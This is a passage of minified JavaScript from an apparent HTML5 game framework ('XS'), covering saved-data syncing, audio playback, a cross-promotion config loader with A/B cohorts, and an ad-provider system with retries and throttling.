            for (var t = this._elems, i = Object.keys(t), n = 0; n < i.length; n++) {
                var r = i[n],
                    o = t[r];
                if (o.remote) {
                    var a = o.value,
                        s = JSON.stringify(a),
                        l = e[r];
                    if (void 0 === l) o.dirtyRemote = !0;
                    else {
                        mergedVal = o.merge(a, l);
                        var h = JSON.stringify(mergedVal),
                            d = JSON.stringify(l);
                        void 0 === mergedVal || s == h && d == h || (o.value = mergedVal, o.setLocal(mergedVal), o.dirtyRemote = !0)
                    }
                }
            }
            this.emit("dataloaded", this._generateChangesPayload())
        }, n.prototype._loadRemote = function(e, t) {
            this._subscribedRemote(e) && (this._initRemote(e), this._mergeRemoteDataElements(t), this.save())
        }, n.prototype._updateSaveLoop = function() {
            void 0 !== this._saveIntervalId && (clearInterval(this._saveIntervalId), this._saveIntervalId = void 0), this._saveInterval > 0 && (this._saveIntervalId = setInterval(this._boundSaveAll, this._saveInterval))
        }, n.prototype._init = function() {
            this._addDefaultRemotes(), this._updateSaveLoop()
        }, n.prototype._changes = function(e) {
            var t = {},
                i = [],
                n = this._elems;
            void 0 === e && (e = Object.keys(n)), e instanceof Array || (e = [e]);
            for (var r = 0; r < e.length; r++) {
                var o = e[r];
                if (this._keyExists(o)) {
                    var a = n[o];
                    a.dirtyRemote && (t[o] = a.value, a.remote && i.push(o))
                }
            }
            return {
                elements: t,
                remoteFields: i
            }
        }, n.prototype._generateChangesPayload = function(e) {
            var t = this._changes(e),
                i = this._elems,
                n = {};
            for (var r in i) i.hasOwnProperty(r) && (n[r] = i[r].value);
            return {
                data: n,
                changedFields: Object.keys(t.elements),
                remoteChangedFields: t.remoteFields
            }
        }, n.prototype._load = function(e, t, i, n) {
            if (this._keyExists(e)) return !1;
            var r = this._elems[e] = {},
                o = void 0 !== t ? t : e;
            i = i.toLowerCase(), this._typeMap[i].localGet(o, function(e, t) {
                r.localValue = e, r.localKeyFound = t, n && n()
            })
        }, n.prototype._add = function(e, t, i) {
            var n = this;
            if (this._keyExists(e)) {
                t = t || {};
                var r = this._typeMap[i],
                    o = this._elems[e];
                o.type = i, o.remote = !0 === t.remote, o.merge = void 0 !== t.merge ? t.merge : r.defMerge, Object.defineProperty(this, e, {
                    set: function(t) {
                        n._setKey(e, t)
                    },
                    get: function() {
                        return n._getKey(e)
                    }
                });
                var a = t.localKey || e;
                o.setLocal = function(e) {
                    r.localSet(a, e)
                }, o.default = void 0 !== t.default ? t.default : r.defVal, o.localKeyFound ? (o.value = o.localValue, o.dirtyRemote = !1) : (o.value = void 0 !== t.default ? t.default : r.defVal, o.setLocal(o.value), o.dirtyRemote = !0), delete o.localValue, delete o.localKeyFound
            }
        }, n.prototype._loadAndAdd = function(e, t, i, n, r) {
            var o = this;

            function a() {
                o._add(e, i, n), r && r(o._elems[e].value)
            }
            i = i || {}, t !== e && (i.localKey = t), this._elems.hasOwnProperty(e) ? a() : this._load(e, t, n, a)
        }, "Float,Int,String,Bool,Object".split(",").forEach(function(e) {
            var t = e.toLowerCase();
            n.prototype["add" + e] = function(e, i, n) {
                this._loadAndAdd(e, e, i, t, n)
            }, n.prototype["add" + e + "WithLocalKey"] = function(e, i, n, r) {
                this._loadAndAdd(e, i, n, t, r)
            }
        }), n.prototype.save = function(e) {
            var t = this._generateChangesPayload(e),
                i = this._changes(e),
                n = Object.keys(i.elements).length;
            for (var r in i.elements) i.elements.hasOwnProperty(r) && (this._elems[r].dirtyRemote = !1);
            i.remoteFields.length;
            if (i.remoteFields.length > 0)
                for (var o = 0; o < this._providers.length; o++) {
                    var a = this._providers[o];
                    if (a.init) {
                        for (var s = 0; s < i.remoteFields.length; s++) {
                            var l = i.remoteFields[s],
                                h = i.elements[l];
                            a.remote.setChange(l, h)
                        }
                        a.remote.saveChanges(function(e) {})
                    }
                }
            n > 0 && this.emit("datasaved", t)
        }, n.prototype.setSaveInterval = function(e) {
            this._saveInterval = e, this._updateSaveLoop()
        }, n.prototype.setDirty = function(e) {
            if (this._keyExists(e)) {
                var t = this._elems[e];
                t.setLocal(t.value), t.dirtyRemote = !0
            }
        }, n.prototype.merge = t, n.prototype.constructor = n, n.prototype.toString = function() {
            for (var e = Object.keys(this._elems), t = "XS.Data elements:", i = 0; i < e.length; i++) {
                var n = e[i],
                    r = this._elems[n];
                t += "\n" + n + ": " + ("object" == typeof r.value ? JSON.stringify(r.value) : r.value) + " (Is Remote: " + r.remote + ")"
            }
            return t
        }, n.prototype.resetToDefaults = function() {
            for (var e = Object.keys(this._elems), t = 0; t < e.length; t++) {
                var i = e[t],
                    n = this._elems[i],
                    r = (n.type, this._typeMap[n.type]);
                n.value = void 0 !== n.default ? n.default : r.defVal, this.setDirty(i), n.dirty = !0
            }
            this.save(e)
        }, e.XS = e.XS || {};
        var r = e.XS;
        r.data = new n
    }(this),
    function(e) {
        function t() {
            this._soundIDs = 0, this._sounds = {}, this._musics = {}, this._userSoundMute = !1, this._userMusicMute = !1, this._engineMute = !1
        }
        t.prototype._init = function() {
            i.initSound(), this._audioPlayer = window.Host && window.Host.Sound ? new function() {
                var e = this;
                e.preload = function(e, t, i) {}, e.play = function(e, t) {}, e.setGain = function(e, t) {}, e.pause = function(e) {}, e.resume = function(e) {}, e.stop = function(e) {}, e.crossfade = function(e) {}, e.setGains = function(e) {}
            } : new function() {
                var e = this;
                e.preload = function(e, t, n) {
                    var r = 1;
                    n && n.gain && (r = n.gain);
                    var o = n.music || !1;
                    return o ? i.Music.get(t, r) : i.Sound.get(t, r)
                }, e.play = function(e, t) {}, e.setGain = function(e, t) {}, e.pause = function(e) {}, e.resume = function(e) {}, e.stop = function(e) {}, e.crossfade = function(e) {}, e.setGains = function(e) {}
            }
        }, t.prototype.preloadSound = function(e, t, n) {
            var r = 1;
            (n = n || {}).gain && (r = n.gain);
            var o = new function(e, t, n) {
                var r = this;
                this._label = e, this._soundID = t, this._initGain = n || 1, this._currentUserGain = n || 1, this._internalSound = null, r.play = function(e) {
                    if ((e = e || {}).gain && (this._currentUserGain = e.gain), this._internalSound) return this._internalSound.play(0, !1), void this._internalSound.setGain(this._currentUserGain);
                    i.audio._audioPlayer.play(this._soundID, e)
                }, r.loop = function(e) {
                    (e = e || {}).gain && (this._currentUserGain = e.gain, this._internalSound && this._internalSound.setGain(this._currentUserGain)), this._internalSound ? this._internalSound.play(0, !0) : (e.loop = !0, this.play(this._soundID, e))
                }, r.setGain = function(e) {
                    this._currentUserGain = e, this._internalSound ? this._internalSound.setGain(e) : (this._currentUserGain = e, i.audio._audioPlayer.setGain(this._soundID, e))
                }, r.resetGain = function() {
                    this._internalSound ? this._internalSound.resetGain() : (this._currentUserGain = this._initGain, i.audio._audioPlayer.setGain(this._soundID, this._initGain))
                }, r.setNewInitGain = function(e) {
                    this._internalSound ? this._internalSound.updateGain(e) : (this._initGain = e, this.resetGain())
                }, r.pause = function() {
                    this._internalSound ? this._internalSound.setMuted(!0) : i.audio._audioPlayer.pause(this._soundID)
                }, r.resume = function() {
                    this._internalSound ? this._internalSound.setMuted(!1) : i.audio._audioPlayer.resume(this._soundID)
                }, r.stop = function() {
                    this._internalSound ? this._internalSound.stop() : i.audio._audioPlayer.stop(this._soundID)
                }
            }(e, ++this._soundIDs, r);
            return this._sounds[e] = o, (n = n || {}).music = !1, o._internalSound = this._audioPlayer.preload(o._soundID, t, n), o
        }, t.prototype.preloadMusic = function(e, t, n) {
            if (!this._musics[e]) {
                var r = 1;
                (n = n || {}).gain && (r = n.gain);
                var o = new function(e, t) {
                    this._label = e, this._initGain = t || 1, this._currentUserGain = t || 1, this._internalMusic = null, this.play = function(e) {
                        if ((e = e || {}).gain && (this._currentUserGain = e.gain), this._internalMusic) return this._internalMusic.play(0, !0), void this._internalMusic.setGain(this._currentUserGain);
                        e.loop = !0, i.audio._audioPlayer.play(this._label, e)
                    }, this.stop = function() {
                        this._internalMusic ? this._internalMusic.stop() : i.audio._audioPlayer.stop(this._label)
                    }, this.crossfade = function(e) {
                        if (e && e.toSoundID && e.duration) {
                            if (this._internalMusic) return;
                            e.fromSoundID = this._label, i.audio._audioPlayer.crossfade(e)
                        }
                    }
                }(e, r);
                return this._musics[e] = o, (n = n || {}).music = !0, o._internalMusic = this._audioPlayer.preload(e, t, n), o
            }
            Host.Log("Error: Trying to preload music with existing label: " + e)
        }, t.prototype.getMusic = function(e) {
            return this._musics[e]
        }, t.prototype.playMusic = function(e, t) {
            var i = this.getMusic(e);
            return i ? i.play(t) : Host.Log("Error: Music with label '" + e + "' not loaded."), i
        }, t.prototype.getSound = function(e) {
            return this._sounds[e]
        }, t.prototype.playSound = function(e, t) {
            var i = this.getSound(e);
            return i ? i.play(t) : Host.Log("Error: Sound with label '" + e + "' not loaded."), i
        }, t.prototype.loopSound = function(e, t) {
            var i = this.getSound(e);
            return i ? i.loop(t) : Host.Log("Error: Sound with label '" + e + "' not loaded."), i
        }, t.prototype.isSoundMuted = function() {
            return this._userSoundMute || this._engineMute
        }, t.prototype.isMusicMuted = function() {
            return this._userMusicMute || this._engineMute
        }, t.prototype.muteSounds = function(e) {
            this._userSoundMute = e, i.muteSound(e)
        }, t.prototype.muteMusics = function(e) {
            this._userMusicMute = e, i.muteMusic(e)
        }, t.prototype.constructor = t, e.XS = e.XS || {};
        var i = e.XS;
        i.audio = new t
    }(this),
    function(e) {
        var t = "./config/";
        var i = e.XS = e.XS || {};
        i.crosspromo = new function() {
            return {
                config: null,
                game: null,
                playerID: null,
                init: function(e, t) {
                    var n, r, o, a = this;
                    this.playerID = t || null, n = function() {
                        a.getConfig(a.game, function(e, t) {
                            if (e) return console.warn(e);
                            a.config = t, i.emit("CrossPromoLoaded")
                        })
                    }, r = 0, o = setInterval(function() {
                        r < 4 && !a.game ? (Config && (a.game = Config.id), r++) : (clearInterval(o), e && (a.game = e), n())
                    }, 100)
                },
                parseUTM: function() {
                    return {
                        source: Host.Web.GetQueryString("utm_source"),
                        medium: Host.Web.GetQueryString("utm_medium"),
                        campaign: Host.Web.GetQueryString("utm_campaign"),
                        content: Host.Web.GetQueryString("utm_content")
                    }
                },
                getConfig: function(e, n) {
                    if (!e) return n(new Error("Game name parameter not provided e.g., getConfig('rocketpope', function(e, r) { return r })"));
                    if (this.config) return console.log("Remote crosspromo config already fetched, so the fetched config will be used instead."), n(null, this.config);
                    var r = new XMLHttpRequest;
                    r.onload = function() {
                        if (200 != r.status) return n(new Error(r.status), r.response);
                        var t, o, a, s = JSON.parse(r.response),
                            l = function(e, t) {
                                var n = {
                                        ab_tests: {}
                                    },
                                    r = [],
                                    o = [];
                                if (t || "function" != typeof ga || ga(function(e) {
                                        var i = e.get("userId") || e.get("clientId");
                                        i && (t = 1 * i.toString().replace(/\D/g, "").substr(-15))
                                    }), !t) return console.warn("No GA userID or clientID retrieved so no remote cross promo config containing ab_tests will be used!");
                                for (var a in e) {
                                    var s = e[a].ab_test_name || "standardCrosspromo";
                                    s && e[a].active && (n.ab_tests[s] ? n.ab_tests[s].cohorts.push(e[a].cohort) : (r.push(s), n.ab_tests[s] = {
                                        cohorts: []
                                    }, n.ab_tests[s].cohorts.push(e[a].cohort)))
                                }
                                if (0 !== r.length && "standardCrosspromo" !== r[0]) {
                                    if (!1 === i.abtest.initialized) i.abtest.init(t, n.ab_tests);
                                    else
                                        for (var l in r) {
                                            var h = r[l];
                                            i.abtest.addTest(t, h, n.ab_tests[h].cohorts, !0)
                                        }
                                    for (var d in r) o.push({
                                        test_name: r[d],
                                        cohort: i.abtest.cohort(r[d])
                                    });
                                    return o
                                }
                            }(s, this.playerID),
                            h = [];
                        for (var d in s)
                            if (s[d].active) {
                                s[d].cohort || (s[d].cohort = "standard");
                                var c = (t = Config && Config.id ? Config.id : e, o = s[d].cohort, (a = void 0) || (a = i.track.getChannel()), "utm_source=" + a + "&utm_medium=crosspromotion&utm_campaign=" + t + "&utm_content=" + o);
                                if (s[d].web)
                                    for (var u in s[d].web) {
                                        var f = s[d].web[u],
                                            p = f.webUrl ? f.webUrl.split("?") : null;
                                        p && (f.webUrl = p[0] !== f.webUrl ? f.webUrl + "&" + c : f.webUrl + "?" + c)
                                    }
                                for (var g in l) s[d].ab_test_name === l[g].test_name && s[d].cohort === l[g].cohort && (h.push(s[d]), console.log("Remote cross-promo config for cohort [" + l[g].cohort + "] fetched!"))
                            }
                        return h.length > 0 ? n(null, h) : (console.log("Remote cross promo config with no ab_test fetched!"), h.push(s[0]), n(null, h))
                    }, r.open("GET", t + e + ".json", !0), r.setRequestHeader("Content-Type", "application/json;charset=UTF-8"), r.send()
                }
            }
        }
    }(this),
    function(e) {
        function t() {}

        function i(e) {
            if ("function" != typeof e) return t;
            if (!0 === e.__isCallbackOnce) return e;

            function i() {
                if ("function" == typeof e) {
                    var t = e;
                    e = void 0;
                    try {
                        return t.apply(this, arguments)
                    } catch (e) {
                        throw window.onerror && window.onerror("Error in callbackOnce: " + (e.message || e.toString()), e), e
                    }
                }
                window.onerror && window.onerror("Warning, callback called more then once.")
            }
            return i.__isCallbackOnce = !0, i.__isSafeCallback = !0, i
        }

        function n() {
            var e = this;
            e._system = void 0, e._log = void 0, e._track = void 0, e._placement = "", e._opts = void 0, e._retriesLeft = 0, e._providerCallTimeoutId = void 0, e.__state = "init", Object.defineProperty(e, "_state", {
                set: function(t) {
                    e._log("Ad: " + e._placement + " state: " + e.__state + " -> " + t), e.__state = t
                },
                get: function() {
                    return e.__state
                }
            }), e._providerConfigs = void 0, e._providerIndex = 0, e._provider = void 0, e._preloadedProviders = [], e._prioritizedProviderError = n.PRIOTITY_PROVIDER_ERROR[0], e.id = -1, e.format = "interstitial", e.testMode = !1, e.config = void 0, e.params = void 0
        }
        console.log("Ads: Loading XS-ads.js"), t.__isCallbackOnce = !0, n.PRIOTITY_PROVIDER_ERROR = ["nofill", "error", "blocked"], n.prototype._setupProvider = function(e) {
            var t = this;
            e && (t._providerIndex++, t._providerIndex == t._providerConfigs.length && (t._providerIndex = 0));
            var i = t._providerConfigs[t._providerIndex];
            t._provider = i.provider, t.config = i.config
        }, n.prototype._configure = function(e, t, i, n, r) {
            var o = this;
            o._system = e, o._log = e._log, o._track = e._track, o._onFinalCB = r, o._placement = t, o._opts = i, o.id = e._adsCounter, o.format = i.format, o.testMode = e._testMode, o.params = i.params, o._providerConfigs = n, o._providerIndex = 0, o._setupProvider(!1), o._retriesLeft = i.maxRetries
        }, n.prototype._reConfigure = function(e, t, i, n) {
            var r = this;
            if (r._onFinalCB = n, r._opts = e, r._providerConfigs = t, r._retriesLeft = e.maxRetries, i) {
                for (var o = 0, a = !1, s = 0; s < t.length; s++) {
                    var l = t[s];
                    if (r._provider == l.provider && r.config == l.config) {
                        o = s, a = !0;
                        break
                    }
                }
                a || r._log("Could not find matching provider index for provider: " + r._provider.name + ", please check"), r._providerIndex = o
            } else r._providerIndex = 0;
            r._setupProvider(!1)
        }, n.prototype._onRunFinished = function(e, t) {
            if (void 0 === this._system) throw new Error("Ad._onRunFinished: Called _onRunFinished with system = undefined.");
            this._system._onAdRunFinished(this, e, t, this._onFinalCB)
        }, n.prototype._run = function() {
            var e = this,
                t = !0;
            if (e._opts.show) {
                (i = e._checkIfSavedPreload()) > -1 && (e._preloadedProviders.splice(i, 1), e._state = "preloaded", e._log("Retrieved saved preload state")), e._provider.supportsPreload && "init" == e._state && (t = !1)
            } else {
                if (!e._provider.supportsPreload) return e._log("Cannot preload as provider does not support preloading"), void e._retry("error");
                if ("preloaded" == e._state) return e._log("Trying to preload an already preloaded ad"), void e._onRunFinished("success", e._opts.show);
                var i;
                if ((i = e._checkIfSavedPreload()) > -1) return e._preloadedProviders.splice(i, 1), e._state = "preloaded", e._log("Retrieved saved preload state"), void e._onRunFinished("success", e._opts.show);
                t = !1
            }
            var n = t ? "show" : "preload";
            e._log("Attempt " + (e._opts.maxRetries - e._retriesLeft + 1) + " of " + e._opts.maxRetries + " using provider: " + e._provider.name + " - run type: " + n);
            try {
                e._provider.isBlocked() ? (e._track(e.format, "blocked", void 0, {
                    provider: e._provider.name
                }), e._retry("blocked")) : (e._startProviderCallTimeout(t), t ? (e._state = "showing", e._provider.show(e)) : (e._state = "preloading", e._provider.preload(e)))
            } catch (i) {
                var r = e._provider.name + "/" + e._placement + "/" + +e._state,
                    o = "Failure to " + n + " ad: " + r + " > error: " + i.message;
                window.onerror && window.onerror(o, i), e._log(o + "; error url: " + i.sourceURL + ", error line: " + i.line);
                try {
                    e._provider.onError(e)
                } catch (t) {
                    e._log("Found an issue while cleaning up provider: " + e._provider.name + " error message: " + t.message + " , error url: " + t.sourceURL + ", error line: " + t.line);
                    o = "Failure in ad._provider.onError ad: " + r + " > error: " + t.message;
                    window.onerror && window.onerror(o, t)
                }
                var a = t ? "finish" : "response";
                e._track(e.format, a, "error", {
                    provider: e._provider.name
                }), e._retry("error")
            }
        }, n.prototype._savePreloaded = function() {
            var e = this;
            e._log("Provider: " + e._provider.name + " - preloaded ad is being saved for later use"), e._preloadedProviders = e._preloadedProviders || [], e._preloadedProviders.push({
                provider: e._provider,
                config: e.config
            })
        }, n.prototype._checkIfSavedPreload = function() {
            for (var e = this, t = -1, i = 0; i < e._preloadedProviders.length; i++) {
                var n = e._preloadedProviders[i];
                if (n.provider == e._provider && n.config == e.config) {
                    t = i;
                    break
                }
            }
            return t > -1 && e._log("Found saved preload at index: " + t), t
        }, n.prototype._startProviderCallTimeout = function(e) {
            var t = this;
            t._providerCallTimeoutId = setTimeout(function() {
                t._log("Provider: " + t._provider.name + " has timed out, id: " + t._providerCallTimeoutId), t._stopProviderCallTimeout();
                try {
                    t._provider.onTimeout(t);
                    var i = e ? "finish" : "response";
                    t._track(t.format, i, "timedout", {
                        provider: t._provider.name
                    }), t._retry("error")
                } catch (n) {
                    t._log("Failure to timeout ad with placement name: " + t._placement + " using provider: " + t._provider.name + " error message: " + n.message + " , error url: " + n.sourceURL + ", error line: " + n.line), window.onerror && window.onerror("Failure to timeout ad with placement name: " + t._placement + " using provider: " + t._provider.name + " error info: " + n.message, n);
                    try {
                        t._provider.onError(t)
                    } catch (e) {
                        t._log("Found an issue while cleaning up provider: " + t._provider.name + " error message: " + e.message + " , error url: " + e.sourceURL + ", error line: " + e.line), window.onerror && window.onerror("Found an issue while cleaning up provider: " + t._provider.name + ", error info: " + e.message, e)
                    }
                    i = e ? "finish" : "response";
                    t._track(t.format, i, "error", {
                        provider: t._provider.name
                    }), t._retry("error")
                }
            }, t._opts.timeoutInterval)
        }, n.prototype._stopProviderCallTimeout = function() {
            var e = this;
            e._providerCallTimeoutId && (e._log("Provider call timeout being reset, id: " + e._providerCallTimeoutId), clearTimeout(e._providerCallTimeoutId)), e._providerCallTimeoutId = void 0
        }, n.prototype._retry = function(e) {
            var t = this;
            if (t._retriesLeft--, t._updatePrioritizedProviderError(e), t._retriesLeft <= 0) return t._state = "init", t._log("No retries left, reporting result"), void t._onRunFinished(t._prioritizedProviderError, t._opts.show);
            t._log("Ad with placement name: " + t._placement + " will retry in " + t._opts.retryInterval + " milliseconds"), setTimeout(function() {
                t._state = "init", t._setupProvider(!0), t._run()
            }, t._opts.retryInterval)
        }, n.prototype._updatePrioritizedProviderError = function(e) {
            var t = n.PRIOTITY_PROVIDER_ERROR.indexOf(e); - 1 != t ? t > n.PRIOTITY_PROVIDER_ERROR.indexOf(this._prioritizedProviderError) && (this._prioritizedProviderError = e) : this._log("Could not prioritize error: " + e + " - unknown error type, please prioritize for usage")
        }, n.prototype.complete = function() {
            this._state = "done"
        };
        var r = {
            INTERST_FIRST_SHOW_TIMEOUT: 1e4,
            INTERST_NEXT_SHOW_TIMEOUT: 3e4,
            REWARD_FIRST_SHOW_TIMEOUT: 0,
            REWARD_NEXT_SHOW_TIMEOUT: 0,
            _testMode: !1,
            _providers: {},
            _queue: [],
            _options: {},
            _adsCounter: 0,
            _ads: {},
            _isOverlayed: !1,
            _isFrozen: !1,
            _isShowing: !1,
            _throttling: {
                interstitial: {
                    systemStart: (new Date).getTime(),
                    lastShow: {}
                },
                reward: {
                    systemStart: (new Date).getTime(),
                    lastShow: {}
                }
            },
            setTestMode: function(e) {
                this._testMode = e
            },
            preload: function(e, t, r) {
                t = i(t);
                var o = this;
                (r = o._sanitizeOpts(r)).show = !1, e || (e = r.format + "_all"), o._log("Starting a preload - placement: " + e + " options: " + JSON.stringify(r));
                var a = o._getAd(e);
                if (a) return o._log("Could not preload ad - ad with placement name '" + e + "' already exists with state '" + a._state + "'"), void(t && t("error"));
                var s = o._getProviderConfigs(e, r.format, !0);
                s ? (o._adsCounter++, a = new n, o._ads[e] = a, a._configure(o, e, r, s, t), a._run()) : t && t("error")
            },
            show: function(e, t, r) {
                t = i(t);
                var a = this;
                if (a._isShowing) return a._log("Could not show ad - ad is currently showing."), t("error");
                (r = a._sanitizeOpts(r)).show = !0, e || (e = r.format + "_all"), a._log("Starting a show - placement: " + e + " options: " + JSON.stringify(r));
                var s = a._isShowingAd();
                if (s) return a._log("Could not show ad - ad with placement name '" + s + "' is currently showing."), void(t && t("error"));
                var l = r.format,
                    h = a._getProviderConfigs(e, l, !1);
                if (!h) return console.warn("XS.ads: Provider config does not exist for: ", {
                    placement: e,
                    format: l
                }, this._queue), void(t && t("error"));
                if (!r.showForce) {
                    var d = a._throttling[r.format].systemStart,
                        c = a._throttling[r.format].lastShow,
                        u = d + r.showFirstDelay,
                        f = (new Date).getTime();
                    if (f < u) return a._log("Throttled an ad '" + e + "' - not allowed for another " + (u - f) / 1e3 + " secs - reason: first show throttle"), a._track(r.format, "throttled", "first"), void(t && t("throttled"));
                    if (c.hasOwnProperty(e) && c[e]) {
                        var p = c[e] + r.showNextDelay;
                        if (f < p) return a._log("Throttled an ad '" + e + "' - not allowed for another " + (p - f) / 1e3 + " secs - reason: show throttle"), a._track(r.format, "throttled", "next"), void(t && t("throttled"))
                    }
                }
                a._isShowing = !0, a._toggleOverlay(!0), a._toggleFreeze(!0), o.muteAll();
                var g = a._getAd(e);
                if (!g) return a._adsCounter++, g = new n, a._ads[e] = g, g._configure(a, e, r, h, t), void g._run();
                if (a._log("Showing with showPref: " + r.showPref + ", state: " + g._state), "priority" == r.showPref) switch (g._state) {
                    case "init":
                        g._reConfigure(r, h, !1, t), g._run();
                        break;
                    case "preloading":
                        g._onRunFinished("interrupted", !1), g._reConfigure(r, h, !1, t);
                        break;
                    case "preloaded":
                        g._savePreloaded(), g._reConfigure(r, h, !1, t), g._run()
                } else switch (g._state) {
                    case "init":
                        g._reConfigure(r, h, !1, t), g._run();
                        break;
                    case "preloading":
                        g._onRunFinished("interrupted", !1), g._reConfigure(r, h, !1, t);
                        break;
                    case "preloaded":
                        g._reConfigure(r, h, !0, t), g._run()
                }
            },
            force: function(e, t, n) {
                t = i(t), (n = n || {}).showForce = !0, this.show(e, t, n)
            },
            isPreloaded: function(e, t) {
                t = t || "interstitial", e || (e = t + "_all");
                var i = this._getAd(e);
                return !!i && "preloaded" == i._state
            },
            addProvider: function(e) {
                var t = this;
                if (t._providers[e.name]) this._log("Ad provider already registered: ", e);
                else {
                    var i = {
                        request: function(e) {
                            t._onRequestCB(e)
                        },
                        response: function(e, i) {
                            t._onResponseCB(e, i)
                        },
                        show: function(e) {
                            t._onShowCB(e)
                        },
                        finish: function(e, i) {
                            t._onFinishCB(e, i)
                        }
                    };
                    e.callbacks = i, e.log = function(e) {
                        t._log(e)
                    }, e.setup && e.setup(), t._providers[e.name] = e, t._queue.push(e), t._sortProviders()
                }
            },
            _log: function(e) {},
            _sanitizeOpts: function(e) {
                return (e = e || {}).format = e.format || "interstitial", e.timeoutInterval = e.timeoutInterval || 5e3, e.maxRetries = e.maxRetries || 1, e.retryInterval = e.retryInterval || 1e3, e.show = e.show || !1, e.showPref = e.showPref || "priority", "interstitial" == e.format ? (void 0 === e.showFirstDelay && (e.showFirstDelay = Config.interstitialShowThrottleFirstDelay), void 0 === e.showFirstDelay && (e.showFirstDelay = r.INTERST_FIRST_SHOW_TIMEOUT), void 0 === e.showNextDelay && (e.showNextDelay = Config.interstitialShowThrottleNextDelay), void 0 === e.showNextDelay && (e.showNextDelay = r.INTERST_NEXT_SHOW_TIMEOUT)) : (void 0 === e.showFirstDelay && (e.showFirstDelay = Config.rewardAdShowThrottleFirstDelay), void 0 === e.showFirstDelay && (e.showFirstDelay = r.REWARD_FIRST_SHOW_TIMEOUT), void 0 === e.showNextDelay && (e.showNextDelay = Config.rewardAdShowThrottleNextDelay), void 0 === e.showNextDelay && (e.showNextDelay = r.REWARD_NEXT_SHOW_TIMEOUT)), e.showForce = e.showForce || !1, e.params = e.params || {}, e
            },
            _getAd: function(e) {
                if (this._ads.hasOwnProperty(e) && this._ads[e]) {
                    var t = this._ads[e];
                    return this._log("Ad with placement '" + e + "' matched ad with id '" + t.id + "'"), t
                }
            },
            _isShowingAd: function() {
                for (var e in this._ads) {
                    var t = this._getAd(e);
                    if (t && "showing" == t._state) return e
                }
            },
            _track: function(e, t, i, n) {
                this._log("Firing tracking call: " + t + ", format: " + e + (i ? ", result: " + i : "") + (n ? ", params: " + JSON.stringify(n) : "")), void 0 === i ? o.track.ad(e, t, void 0, n) : o.track.ad(e, t, i, void 0, n)
            },
            _getConfig: function(e, t, i) {
                if (Config.adIds && Config.adIds[i.name] && Config.adIds[i.name][e] && Config.adIds[i.name][e].format && Config.adIds[i.name][e].format === t && Config.adIds[i.name][e].config) return Config.adIds[i.name][e].config
            },
            _sortProviders: function() {
                this._queue.sort(function(e, t) {
                    var i = e.priority || 0,
                        n = t.priority || 0;
                    return i < n ? 1 : i == n ? 0 : i > n ? -1 : void 0
                }), this._log("Registered ad providers: " + this._queue.length)
            },
            _getProviderConfigs: function(e, t, i) {
                if (0 != this._queue.length) {
                    for (var n = [], r = 0; r < this._queue.length; r++) {
                        var o = this._queue[r];
                        if (o.supportsFormat(t))
                            if (!i || o.supportsPreload) {
                                var a = this._getConfig(e, t, o);
                                this._log("Provider: '" + o.name + "', mapped ad name: '" + e + "' to: " + JSON.stringify(a)), a ? n.push({
                                    provider: o,
                                    config: a
                                }) : this._log("Could not preload ad - placement configuration for selected provider '" + o.name + "' is missing")
                            } else this._log("Could not preload ad - provider '" + o.name + "' does not support preloading");
                        else this._log("Could not preload ad - provider '" + o.name + "' does not support format")
                    }
                    if (0 != n.length) return this._log("There are " + n.length + " eligible provider(s)"), n;
                    this._log("There are no eligible providers - all filtered out")
                } else this._log("There are no eligible providers - none registered")
            },
            _onRequestCB: function(e) {
                var t = e._placement;
                this._log("Ad 'onRequest' - id: " + e.id + ", placement: " + t), this._getAd(t) || this._log("Ad for placement: " + t + " with id: " + e.id + " is not available!"), this._track(e.format, "request", void 0, {
                    provider: e._provider.name
                })
            },
            _onResponseCB: function(e, t) {
                var i = e._placement;
                switch (this._log("Ad 'onResponse' - id: " + e.id + ", placement: " + i + ", result: " + t), this._getAd(i) || this._log("Ad for placement: " + i + " with id: " + e.id + " is not available!"), e._stopProviderCallTimeout(), this._track(e.format, "response", t, {
                    provider: e._provider.name
                }), t) {
                    case "success":
                        e._state = "preloaded", e._opts.show ? (e._log("Showing after preload"), e._run()) : e._onRunFinished(t, e._opts.show);
                        break;
                    default:
                        this._log("Unhandled result state: '" + t + "', please check");
                    case "nofill":
                    case "error":
                    case "blocked":
                        e._retry(t)
                }
            },
            _onShowCB: function(e) {
                var t = e._placement;
                this._log("Ad 'onShow' - id: " + e.id + ", placement: " + t), this._getAd(t) || this._log("Ad for placement: " + t + " with id: " + e.id + " is not available!"), e._stopProviderCallTimeout(), this._track(e.format, "show", void 0, {
                    provider: e._provider.name
                }), this._hideLoadSpinner()
            },
            _onFinishCB: function(e, t) {
                var i = e._placement;
                switch (this._log("Ad 'onFinish' - id: " + e.id + ", placement: " + i + ", result: " + t), this._getAd(i) || this._log("Ad for placement: " + i + " with id: " + e.id + " is not available!"), e._stopProviderCallTimeout(), this._track(e.format, "finish", t, {
                    provider: e._provider.name
                }), t) {
                    case "success":
                    case "skipped":
                    case "ratelimited":
                        e._onRunFinished(t, e._opts.show);
                        break;
                    default:
                        this._log("Unhandled result state: '" + t + "', please check");
                    case "nofill":
                    case "error":
                    case "blocked":
                        e._retry(t)
                }
            },
            _outputSystemStatus: function() {},
            _onAdRunFinished: function(e, t, i, n) {
                var r = this;

                function a() {
                    r._isShowing = !1, o.unmuteAll(), i && (r._toggleFreeze(!1), r._toggleOverlay(!1)), r._outputSystemStatus(), n && n(t)
                }
                if (r._log("Ad '" + (i ? "show" : "preload") + "' run finished with result: " + t), i) switch (t) {
                    case "success":
                    case "skipped":
                        var s = r._throttling[e.format];
                        s.systemStart && (s.systemStart = 0), s.lastShow[e._placement] = (new Date).getTime(), e.complete(), delete r._ads[e._placement], a();
                        break;
                    default:
                        r._log("Unhandled ad run result: " + t + " - please handle properly");
                    case "nofill":
                    case "error":
                    case "blocked":
                        a()
                } else switch (t) {
                    default: r._log("Unhandled ad run result: " + t + " - please handle properly");
                    case "success":
                            case "nofill":
                            case "error":
                            case "blocked":
                            case "interrupted":
                            a()
                }
            },
            _toggleOverlay: function(e) {
                e ? (o.loadSpinner && o.loadSpinner.show(), this._isOverlayed = !0) : this._isOverlayed && (this._isOverlayed = !1, o.loadSpinner && o.loadSpinner.hide())
            },
            _hideLoadSpinner: function() {
                this._isOverlayed && o.loadSpinner && o.loadSpinner.hideSpinner()
            },
            _toggleFreeze: function(e) {
                e ? (o.freeze(), this._isFrozen = !0) : this._isFrozen && (this._isFrozen = !1, o.unfreeze())
            }
        };
        e.XS = e.XS || {};
        var o = e.XS;
        o.ads = r
    }(this), window.vpath = window.vpath || "./", document.body.addEventListener("MSHoldVisual", function(e) {
        e.preventDefault()
    }, !1), document.body.addEventListener("contextmenu", function(e) {
        e.preventDefault()
